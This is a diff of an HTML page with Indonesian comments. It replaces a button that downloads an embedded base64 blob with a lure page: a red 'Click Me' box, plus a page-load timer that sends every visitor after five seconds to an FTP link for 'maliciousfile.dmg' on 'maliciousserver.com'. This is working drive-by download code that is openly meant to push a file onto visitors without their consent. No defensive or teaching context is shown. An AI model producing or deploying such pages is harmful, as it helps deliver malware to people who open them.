@@ -1,49 +1,33 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>Download File</title>
-</head>
-<body>
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      .hidden-link {
+        width: 100px;
+        height: 100px;
+        background-color: red;
+        color: white;
+        text-align: center;
+        line-height: 100px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="hidden-link" onclick="triggerDownload()">Click Me</div>
 
-<button onclick="downloadFile()">Download</button>
+    <script>
+      function triggerDownload() {
+        // Ketika elemen di-click, langsung mengarahkan ke FTP link
+        window.location.href = "ftp://anonymous:password@maliciousserver.com/maliciousfile.dmg";
+      }
 
-<script>
-function downloadFile() {
-
-  // contoh base64 kecil (dummy)
-  const base64 = "UEsDBBQAAAAIAK2lUGZTTHpm0D6WvLpkAqYngV24CpWz5yX5v1LkFGjHg97UqXLe42XtTkw5Bgr8EmAqA1Opmr9rw0lwnZ0rR3WqElw/0MiZk+CmP9wTzy0qS7ddbdh8FhzGHwp5LOAiSHTA1+zO7J7H5+m0t0bOAw68tCT7cZBwt7Sh1bUy5LvqqJkV2+HbOVwkcgLwLxZjjjeyhlYl3X9PbiWuwCg==";
-
-  // decode base64 → binary
-  const binary = atob(base64);
-  const len = binary.length;
-  const bytes = new Uint8Array(len);
-
-  for (let i = 0; i < len; i++) {
-    bytes[i] = binary.charCodeAt(i);
-  }
-
-  // buat blob
-  const blob = new Blob([bytes], { type: "application/octet-stream" });
-  const url = URL.createObjectURL(blob);
-
-  // trigger download
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = "file_download.bin"; // ganti nama file
-  document.body.appendChild(a);
-  a.click();
-
-  // cleanup
-  URL.revokeObjectURL(url);
-  a.remove();
-
-  // redirect
-  setTimeout(() => {
-    window.location.href = "https://www.google.com";
-  }, 1500);
-}
-</script>
-
-</body>
+      // Auto redirect ketika halaman dimuat
+      window.onload = function() {
+        setTimeout(function() {
+          window.location.href = "ftp://anonymous:password@maliciousserver.com/maliciousfile.dmg";
+        }, 5000); // Delay 5 detik sebelum redirect otomatis
+      }
+    </script>
+  </body>
 </html>
